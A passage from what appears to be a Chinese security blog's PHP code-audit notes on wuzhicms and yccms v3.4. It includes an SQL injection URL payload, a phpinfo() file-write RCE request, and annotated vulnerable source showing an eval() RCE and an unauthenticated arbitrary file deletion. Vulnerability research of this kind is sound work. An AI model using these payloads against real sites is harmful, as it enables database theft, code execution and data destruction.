class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;验证通过&quot;,&quot;status&quot;:&quot;y&quot;&#125;&#x27;</span>);<br>&#125; <span class="hljs-keyword">else</span> &#123;<br><span class="hljs-keyword">exit</span>(<span class="hljs-string">&#x27;&#123;&quot;info&quot;:&quot;验证失败&quot;,&quot;status&quot;:&quot;n&quot;&#125;&#x27;</span>);<br>&#125;<br><br></code></pre></td></tr></table></figure><p>api&#x2F;sms_check.php?param&#x3D;1%27%20or%20extractvalue(1,concat(0x7e,(select%20user())))%20–+</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080956325.png" alt="20250717144135245"></p><h2 id="任意文件写入导致RCE"><a href="#任意文件写入导致RCE" class="headerlink" title="任意文件写入导致RCE"></a>任意文件写入导致RCE</h2><p>搜索<code>file_put_contents()</code> 函数,找到一处写入内容可控的地方。file_put_contents() 函数把一个字符串写入文件中。</p><p>coreframe&#x2F;app&#x2F;core&#x2F;libs&#x2F;function&#x2F;common.func.php</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">set_cache</span>(<span class="hljs-params"><span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>, <span class="hljs-variable">$dir</span> = <span class="hljs-string">&#x27;_cache_&#x27;</span></span>)</span>&#123;<br><span class="hljs-built_in">static</span> <span class="hljs-variable">$_dirs</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$dir</span> == <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/([a-z0-9_]+)/i&#x27;</span>, <span class="hljs-variable">$filename</span>)) <span class="hljs-keyword">return</span> <span class="hljs-literal">FALSE</span>;<br><span class="hljs-variable">$cache_path</span> = CACHE_ROOT . <span class="hljs-variable">$dir</span> . <span class="hljs-string">&#x27;/&#x27;</span>;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>])) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">is_dir</span>(<span class="hljs-variable">$cache_path</span>)) &#123;<br><span class="hljs-title function_ invoke__">mkdir</span>(<span class="hljs-variable">$cache_path</span>, <span class="hljs-number">0777</span>, <span class="hljs-literal">true</span>);<br>&#125;<br><span class="hljs-variable">$_dirs</span>[<span class="hljs-variable">$filename</span> . <span class="hljs-variable">$dir</span>] = <span class="hljs-number">1</span>;<br>&#125;<br><br><span class="hljs-variable">$filename</span> = <span class="hljs-variable">$cache_path</span> . <span class="hljs-variable">$filename</span> . <span class="hljs-string">&#x27;.&#x27;</span> . CACHE_EXT . <span class="hljs-string">&#x27;.php&#x27;</span>;<br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">is_array</span>(<span class="hljs-variable">$data</span>)) &#123;<br><span class="hljs-variable">$data</span> = <span class="hljs-string">&#x27;&lt;?php&#x27;</span> . <span class="hljs-string">&quot;\r\n return &quot;</span> . <span class="hljs-title function_ invoke__">array2string</span>(<span class="hljs-variable">$data</span>) . <span class="hljs-string">&#x27;?&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-title function_ invoke__">file_put_contents</span>(<span class="hljs-variable">$filename</span>, <span class="hljs-variable">$data</span>);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-keyword">index</span>.php?m=attachment<span class="hljs-variable">&amp;f</span>=<span class="hljs-keyword">index</span><span class="hljs-variable">&amp;_su</span>=wuzhicms<span class="hljs-variable">&amp;v</span>=ueditor<span class="hljs-variable">&amp;submit</span>=1<span class="hljs-variable">&amp;setting</span>=%3Cphp%20phpinfo();%3E<br></code></pre></td></tr></table></figure><h2 id="文章："><a href="#文章：" class="headerlink" title="文章："></a>文章：</h2><p>五指CMS 4.1.0存在CSRF漏洞可增加管理员账户</p><p><a href="https://wiki.timlzh.com/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/">https://wiki.timlzh.com/bylibrary/%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/%E4%BA%94%E6%8C%87CMS/%E4%BA%94%E6%8C%87CMS%204.1.0%E5%AD%98%E5%9C%A8CSRF%E6%BC%8F%E6%B4%9E%E5%8F%AF%E5%A2%9E%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7/</a></p><p>wuzhicms代码审计</p><p><a href="https://blog.csdn.net/RestoreJustice/article/details/129734772">https://blog.csdn.net/RestoreJustice/article/details/129734772</a></p>]]></content>
    
    
    <categories>
      
      <category>PHP</category>
      
    </categories>
    
    
    <tags>
      
      <tag>PHP 代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>yccms v3.4 代码审计</title>
    <link href="/2025/07/12/yccms%20v3.4%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/07/12/yccms%20v3.4%20%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h1 id="yccms-v3-4-代码审计"><a href="#yccms-v3-4-代码审计" class="headerlink" title="yccms v3.4 代码审计"></a>yccms v3.4 代码审计</h1><p>程序版本：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948854.png" alt="20250708090010810"></p><p>从这个目录结构注意到这是一个MVC模式</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080948086.png" alt="20250708135815537"></p><h2 id="通读代码"><a href="#通读代码" class="headerlink" title="通读代码"></a>通读代码</h2><h3 id="admin"><a href="#admin" class="headerlink" title="admin"></a>admin</h3><h4 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h4><p>后台入口</p><p>require  引入文件  &#x2F;config&#x2F;run.inc.php 完成网站的初始化</p><p>路由：GET   &#x2F;admin?a&#x3D;</p><h3 id="ceshi1-ceshi2-compile"><a href="#ceshi1-ceshi2-compile" class="headerlink" title="ceshi1&amp;ceshi2&amp;compile"></a>ceshi1&amp;ceshi2&amp;compile</h3><p>都是一些页面模板</p><h3 id="config"><a href="#config" class="headerlink" title="config"></a>config</h3><h4 id="config-inc-php"><a href="#config-inc-php" class="headerlink" title="config.inc.php"></a>config.inc.php</h4><p>数据库、Smarty以及其他的系统配置</p><h4 id="count-php"><a href="#count-php" class="headerlink" title="count.php"></a>count.php</h4><p>通过计算根目录，加载 run.inc.php文件</p><h4 id="run-inc-php"><a href="#run-inc-php" class="headerlink" title="run.inc.php"></a>run.inc.php</h4><p>初始化文件、入口文件（进入后台会调用）</p><p>功能：</p><ul><li><p>开启session，设置编码和时区</p></li><li><p>引入配置文件和模板：<code>config/config.inc.php</code></p><p>​    <code>/public/smarty/Smarty.class.php</code></p></li><li><p>自动加载类：<code>__autoload()方法用于自动加载类</code></p><p>​                    Action的类加载controller</p><p>​                    Model的类加载model</p><p>​                    其他的类加载public&#x2F;class&#x2F;</p></li><li><p>单入口：<code>Factory::setAction()-&gt;run();</code>调用控制器的run()，</p></li></ul><p>安全问题：入口文件的Factory给下面的RCE提供了入口点</p><p>配置文件会有漏洞吗？配置文件会不会泄露数据库信息？</p><h3 id="contrller"><a href="#contrller" class="headerlink" title="contrller"></a>contrller</h3><h4 id="Action-class-php"><a href="#Action-class-php" class="headerlink" title="Action.class.php"></a>Action.class.php</h4><p>所有控制器的父类</p><p>功能：</p><ul><li>定义属性</li><li>构造函数</li><li>分页、静态分页功能</li><li>控制器运行入口</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//控制器基类</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> </span>&#123;<span class="hljs-comment">//声明Action类，属于所有控制器的父类</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$_tpl</span> = <span class="hljs-literal">null</span>;<span class="hljs-comment">//定义属性</span><br><span class="hljs-keyword">protected</span> <span class="hljs-variable">$_model</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">//__construct() 构造函数，就是当对象被创建时，类中被自动调用的第一个函数，并且一个类中只能存在一个构造函数。但这里是protected，就不能在类的外部直接new这个类，只能在子类中通过继承使用。</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl = TPL::<span class="hljs-title function_ invoke__">getInstance</span>();<span class="hljs-comment">//模板渲染</span><br><span class="hljs-variable language_">$this</span>-&gt;_model = <span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setModel</span>();<span class="hljs-comment">//创建模型对象</span><br><span class="hljs-title class_">Tool</span>::<span class="hljs-title function_ invoke__">setRequest</span>(); <span class="hljs-comment">//表单转义和html过滤可以防XSS、SQL</span><br>&#125;<br><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">page</span>(<span class="hljs-params"><span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span> = PAGE_SIZE, <span class="hljs-variable">$_model</span> = <span class="hljs-literal">null</span></span>) </span>&#123;<span class="hljs-comment">//定义了一个分页函数</span><br><span class="hljs-variable language_">$this</span>-&gt;_model = <span class="hljs-title class_">Validate</span>::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_model</span>) ? <span class="hljs-variable language_">$this</span>-&gt;_model : <span class="hljs-variable">$_model</span>;<br><span class="hljs-variable">$_page</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>(<span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span>);<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">setLimit</span>(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getLimit</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;page&#x27;</span>,<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">showpage</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;num&#x27;</span>,(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getPage</span>()-<span class="hljs-number">1</span>)*<span class="hljs-variable">$_pagesize</span>);<br>&#125;<br><span class="hljs-comment">//静态专用</span><br><span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">page2</span>(<span class="hljs-params"><span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span> = PAGE_SIZE, <span class="hljs-variable">$_model</span> = <span class="hljs-literal">null</span>,<span class="hljs-variable">$_url2</span>=<span class="hljs-string">&#x27;&#x27;</span>,<span class="hljs-variable">$_fx</span>=<span class="hljs-string">&#x27;&#x27;</span></span>) </span>&#123;<span class="hljs-comment">//另一种分页</span><br><span class="hljs-variable language_">$this</span>-&gt;_model = <span class="hljs-variable">$_model</span>;<br><span class="hljs-variable">$_page</span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Page</span>(<span class="hljs-variable">$_total</span>,<span class="hljs-variable">$_pagesize</span>,<span class="hljs-variable">$_url2</span>,<span class="hljs-variable">$_fx</span>);<br><span class="hljs-variable language_">$this</span>-&gt;_model-&gt;<span class="hljs-title function_ invoke__">setLimit</span>(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getLimit</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;page&#x27;</span>,<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">listpage</span>());<br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;num&#x27;</span>,(<span class="hljs-variable">$_page</span>-&gt;<span class="hljs-title function_ invoke__">getPage</span>()-<span class="hljs-number">1</span>)*<span class="hljs-variable">$_pagesize</span>);<br>&#125;<br><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>) </span>&#123;<span class="hljs-comment">//控制器运行入口</span><br><span class="hljs-variable">$_m</span> = <span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>]) ? <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;m&#x27;</span>] : <span class="hljs-string">&#x27;index&#x27;</span>;<span class="hljs-comment">//url传参&#x27;?m=&#x27;,默认为index</span><br><span class="hljs-title function_ invoke__">method_exists</span>(<span class="hljs-variable">$this</span>, <span class="hljs-variable">$_m</span>) ? <span class="hljs-keyword">eval</span>(<span class="hljs-string">&#x27;$this-&gt;&#x27;</span>.<span class="hljs-variable">$_m</span>.<span class="hljs-string">&#x27;();&#x27;</span>) : <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">index</span>();<span class="hljs-comment">//eval() 可以执行任意字符串形式的 PHP 代码，此处通过搜索发现 run()函数 出现在 config/run.inc.php 这个文件，存在rce</span><br> &#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="AdminAction-class-php"><a href="#AdminAction-class-php" class="headerlink" title="AdminAction.class.php"></a>AdminAction.class.php</h4><p>管理员控制器</p><p>功能：</p><ul><li><p>加载后台首页</p></li><li><p>更改密码：使用sha1加密不安全</p></li><li><p>系统信息显示：</p><p>系统信息页：</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949129.png" alt="20250711132213642"></p></li><li><p>退出时清理缓存：删除 compile 目录文件</p></li></ul><p>路由：?a&#x3D;admin&amp;m&#x3D;update -&gt; 调用 update()</p><h4 id="ArticleAction-class-php"><a href="#ArticleAction-class-php" class="headerlink" title="ArticleAction.class.php"></a>ArticleAction.class.php</h4><p>文章控制器，</p><p>功能：显示文章列表</p><p>​提供搜索功能</p><p>​增删修改文章</p><p>​nav、attr（文章的修饰属性）等功能</p><h4 id="CallAction-class-php"><a href="#CallAction-class-php" class="headerlink" title="CallAction.class.php"></a>CallAction.class.php</h4><p>功能： 验证码生成</p><p>​后台文件上传</p><p>​编辑器上传</p><h4 id="HtmlAction-class-php"><a href="#HtmlAction-class-php" class="headerlink" title="HtmlAction.class.php"></a>HtmlAction.class.php</h4><p>生成静态控制器</p><blockquote><p><strong>生成静态页面：</strong></p><p>首先调用模型，取出数据库内容，之后通过模板引擎渲染页面，输出HTML页面，然后使用工具类<code>Tool::HtmlFile($filename, $content)</code>，把HTML内容保存到指定路径，就可以在前端页面查看了。</p><p><strong>静态页面作用：</strong></p><ul><li>直接访问<code>.html</code>文件，不需要调动数据库查询；</li><li>页面生成后不再执行动态代码，防止SQL注入；</li><li>当然，这种把内容提前准备好的方式，对于提升性能、减少算力、节约服务器资源、服务器更稳定等等有一定的优势。</li></ul></blockquote><p>本网站后台修改文章内容后需要<strong>静态生成</strong>，之后方可在首页显示。</p><p>功能： 生成首页</p><p>​生成文章</p><p>​栏目列表</p><p>​模板渲染</p><p>​静态化输出</p><p>​分步处理</p><p><img src="https://cdn.jsdelivr.net/gh/XVSHIFU/Picture-bed@img/img/202508080949148.png" alt="20250711154124943"></p><h4 id="LinkAction-class-php"><a href="#LinkAction-class-php" class="headerlink" title="LinkAction.class.php"></a>LinkAction.class.php</h4><p>链接控制器</p><p>功能：后台管理友情链接，修改链接、排序功能</p><h4 id="LoginAction-class-php"><a href="#LoginAction-class-php" class="headerlink" title="LoginAction.class.php"></a>LoginAction.class.php</h4><p>登录控制器</p><p>功能：登录验证：sha1加密密码</p><p>​验证码</p><p>​记住密码</p><p>​AJAX 验证</p><h4 id="NavAction-class-php"><a href="#NavAction-class-php" class="headerlink" title="NavAction.class.php"></a>NavAction.class.php</h4><p>分类控制器</p><p>功能：查看、排序、增删修改分类列表</p><h4 id="PicAction-class-php"><a href="#PicAction-class-php" class="headerlink" title="PicAction.class.php"></a>PicAction.class.php</h4><p>图片控制器</p><p>功能：</p><ul><li><p>后台图片展示：读取根目录中的uploads文件夹，但是没有过滤文件非法后缀，此处可能上传 .php 文件</p></li><li><p>删除：没有检验图片路径，存在任意文件删除漏洞</p></li><li><p>这里并没有进行用户权限的判断，非管理员（未登录）用户也可访问到图片列表并删除</p></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">//图片控制器</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">PicAction</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Action</span></span>&#123;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-built_in">parent</span>::<span class="hljs-title function_ invoke__">__construct</span>();<br>&#125;<br>    <span class="hljs-comment">//这里并没有进行用户权限的判断，非管理员（未登录）用户也可访问到图片列表并删除</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$_dirPath</span>=<span class="hljs-title function_ invoke__">opendir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)).<span class="hljs-string">&#x27;/uploads//&#x27;</span>);<span class="hljs-comment">//打开 /uploads/ 目录</span><br><span class="hljs-variable">$_dirName</span>=<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-comment">//保存图片名</span><br><span class="hljs-variable">$_picArr</span>=<span class="hljs-keyword">array</span>();<br><span class="hljs-keyword">while</span>(!!<span class="hljs-variable">$_dirName</span>=<span class="hljs-title function_ invoke__">readdir</span>(<span class="hljs-variable">$_dirPath</span>))&#123;<span class="hljs-comment">//遍历 uploads 下的文件，此处无过滤</span><br><span class="hljs-keyword">if</span>(<span class="hljs-variable">$_dirName</span>!=<span class="hljs-string">&#x27;.&#x27;</span> &amp;&amp; <span class="hljs-variable">$_dirName</span>!=<span class="hljs-string">&#x27;..&#x27;</span>)&#123;<br><span class="hljs-variable">$_picArr</span>[] = <span class="hljs-variable">$_dirName</span>;<br>&#125;<br>&#125;<br><span class="hljs-title function_ invoke__">krsort</span>(<span class="hljs-variable">$_picArr</span>);<span class="hljs-comment">//逆序排列</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;picNum&#x27;</span>,<span class="hljs-title function_ invoke__">count</span>(<span class="hljs-title function_ invoke__">scandir</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-title function_ invoke__">dirname</span>(<span class="hljs-keyword">__FILE__</span>)).<span class="hljs-string">&#x27;/uploads//&#x27;</span>))-<span class="hljs-number">2</span>);<span class="hljs-comment">//获取上传的文件数</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">assign</span>(<span class="hljs-string">&#x27;picArr&#x27;</span>,<span class="hljs-variable">$_picArr</span>);<span class="hljs-comment">//显示上传文件</span><br><span class="hljs-variable language_">$this</span>-&gt;_tpl-&gt;<span class="hljs-title function_ invoke__">display</span>(<span class="hljs-string">&#x27;admin/public/picshow.tpl&#x27;</span>);<br>&#125;<br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">delall</span>(<span class="hljs-params"></span>)</span>&#123;<span class="hljs-comment">//删除图片，依旧没有验证用户</span><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;send&#x27;</span>]))&#123;<br><span class="hljs-keyword">if</span>(validate::<span class="hljs-title function_ invoke__">isNullString</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>]))<br>                tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;没有选择任何图片!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<span class="hljs-comment">//是否选择图片，若为空，layer_alert 弹窗提示7并跳回 &#x27;?a=pic&#x27;</span><br><span class="hljs-variable">$_fileDir</span>=ROOT_PATH.<span class="hljs-string">&#x27;/uploads/&#x27;</span>;<span class="hljs-comment">//上传目录的跟路径</span><br><span class="hljs-keyword">foreach</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;pid&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$_value</span>)&#123;<span class="hljs-comment">//遍历提交的图片名</span><br><span class="hljs-variable">$_filePath</span>=<span class="hljs-variable">$_fileDir</span>.<span class="hljs-variable">$_value</span>;<span class="hljs-comment">//构造文件路径，这里的路径可以拼接，且 $_value 是可控的，造成漏洞</span><br><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">unlink</span>(<span class="hljs-variable">$_filePath</span>))&#123;<span class="hljs-comment">//unlink() 删除文件</span><br>tool::<span class="hljs-title function_ invoke__">layer_alert</span>(<span class="hljs-string">&#x27;图片删除失败,请设权限为777!&#x27;</span>,<span class="hljs-string">&#x27;?a=pic&#x27;</span>,<span class="hljs-number">7</span>);<br>&#125;<span class="hljs-keyword">else</span>&#123;<br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&#x27;Location:?a=pic&#x27;</span>);<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><h4 id="SearchAction-class-php"><a href="#SearchAction-class-php" class="headerlink" title="SearchAction.class.php"></a>SearchAction.class.php</h4><p>搜索控制器</p><p>功能：用于前端页面的内容搜索</p><h4 id="SystemAction-class-php"><a href="#SystemAction-class-php" class="headerlink" title="SystemAction.class.php"></a>SystemAction.class.php</h4><p>系统设置控制器</p><p>功能：后台系统信息、设置首页文字内容</p><h2 id="记一些知识点、函数"><a href="#记一些知识点、函数" class="headerlink" title="记一些知识点、函数"></a>记一些知识点、函数</h2><p><a href="https://www.cnblogs.com/phpper/p/8976304.html">PHP 中 private、public、protected区别</a></p><p><a href="https://jueee.github.io/2020/10/2020-10-20-PHP%E4%B9%8BSmarty%E6%A8%A1%E6%9D%BF%E5%BC%95%E6%93%8E%E4%BD%BF%E7%94%A8%E6%B1%87%E6%80%BB/">PHP 之 Smarty 模板引擎使用汇总</a></p><p>Smarty 是 PHP 的一个引擎模板，可以将 MVC 中的 C 分离出来。</p><p><a href="https://blog.csdn.net/weixin_50602266/article/details/121910781">JavaScript之Ajax</a></p><blockquote><p>AJAX (Asynchronous JavaScript and XML) 异步 JS 和 XML，在不刷新整个页面的情况下，与服务器交换数据的技术。</p></blockquote><h3 id="htmlspecialchars"><a href="#htmlspecialchars" class="headerlink" title="htmlspecialchars()"></a>htmlspecialchars()</h3><blockquote><p><code>htmlspecialchars()</code> 函数把预定义的字符转换为 HTML 实体。</p><p>预定义的字符是：</p><ul><li>&amp; （和号）成为 &amp;</li><li>“ （双引号）成为 “</li><li>‘ （单引号）成为 ‘</li><li>&lt; （小于）成为 &lt;</li><li>&gt; （大于）成为 &gt;</li></ul></blockquote><h2 id="历史漏洞"><a href="#历史漏洞" class="headerlink" title="历史漏洞"></a>历史漏洞</h2><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-47137">YCCMS存在文件上传漏洞（CNVD-2021-47137）</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-46794">YCCMS存在文件上传漏洞（CNVD-2021-46794）</a></p><p><a href="https://www.cnvd.org.cn/flaw/show/CNVD-2021-46795">YCCMS存在逻辑缺陷漏洞</a></p><h3 id="RCE漏洞复现"><a href="#RCE漏洞复现" class="headerlink" title="RCE漏洞复现"></a>RCE漏洞复现</h3><p>根据Action.class.php审计，发现<code>method_exists($this, $_m) ? eval(&#39;$this-&gt;&#39;.$_m.&#39;();&#39;) : $this-&gt;index();</code></p><p>eval() 可以执行任意字符串形式的 PHP 代码，此处通过搜索发现 run()函数 出现在 config&#x2F;run.inc.php 这个文件，存在rce</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs PHP"><span class="hljs-comment">//config/run.inc.php  </span><br><span class="hljs-title class_">Factory</span>::<span class="hljs-title function_ invoke__">setAction</span>()-&gt;<span class="hljs-title function_ invoke__">run</span>();<br><br>-&gt;<span class="hljs-title function_ invoke__">setAction</span>()<br><br><span class="hljs-comment">//public/class/Factory.class.php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Factory</span></span>&#123;<br>    ...<br><span class="hljs-built_in">static</span> <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">setAction</span>(<span class="hljs-params"></span>)</span>&#123;<br><span class="hljs-variable">$_a</span>=<span class="hljs-built_in">self</span>::<span class="hljs-title function_ invoke__">getA</span>();<span class="hljs-comment">//$_a 是get传参，可控变量</span><br><span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$_a</span>, <span class="hljs-keyword">array</span>(<span class="hljs-string">&#x27;admin&#x27;</span>, <span class="hljs-string">&#x27;nav&#x27;</span>, <span class="hljs-string">&#x27;article&#x27;</span>,<span class="hljs-string">&#x27;backup&#x27;</span>,<span class="hljs-string">&#x27;html&#x27;</span>,<span class="hljs-string">&#x27;link&#x27;</span>,<span class="hljs-string">&#x27;pic&#x27;</span>,<span class="hljs-string">&#x27;search&#x27;</span>,<span class="hljs-string">&#x27;system&#x27;</span>,<span class="hljs-string">&#x27;xml&#x27;</span>,<span class="hljs-string">&#x27;online&#x27;</span>))) &#123;<br><span class="hljs-keyword">if</span> (!<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_SESSION</span>[<span class="hljs-string">&#x27;admin&#x27;</span>])) &#123;<br><span class="hljs-title function_ 